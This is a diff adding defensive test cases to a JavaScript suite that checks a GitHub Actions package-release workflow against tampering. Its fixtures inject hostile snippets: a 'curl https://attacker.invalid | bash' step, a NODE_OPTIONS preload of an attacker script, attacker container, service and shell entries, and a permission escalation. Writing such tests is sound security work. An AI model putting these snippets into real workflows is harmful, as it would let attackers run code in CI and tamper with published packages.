@@ -63,4 +63,20 @@ describe('package release workflow security validation', () => {
       '.github/workflows/package-release.yml must bind artifact provenance to its PR head SHA.',
     ]))
   })
+
+  it.each([
+    ['workflow environment', 'permissions:\n  contents: read', 'env:\n  NODE_OPTIONS: --require /tmp/attacker.cjs\n\npermissions:\n  contents: read'],
+    ['unexpected job', 'jobs:\n', 'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n'],
+    ['arbitrary command', '      - name: Create or update the coordinated package release PR', '      - run: curl https://attacker.invalid | bash\n\n      - name: Create or update the coordinated package release PR'],
+    ['job container', '  publish:\n    name:', '  publish:\n    container: attacker/image:latest\n    name:'],
+    ['job service', '  publish:\n    name:', '  publish:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:'],
+    ['step shell', '        run: node --disable-warning=MODULE_TYPELESS_PACKAGE_JSON scripts/package-release-promote.ts', '        shell: attacker-shell\n        run: node --disable-warning=MODULE_TYPELESS_PACKAGE_JSON scripts/package-release-promote.ts'],
+    ['permission drift', '      actions: read', '      actions: write'],
+  ])('rejects exact package workflow contract drift through %s', async (_name, target, replacement) => {
+    const result = await validateWorkflow(validWorkflow.replace(target, replacement))
+
+    expect(result.violations).toContain(
+      '.github/workflows/package-release.yml must match its exact fail-closed AST contract.',
+    )
+  })
 })
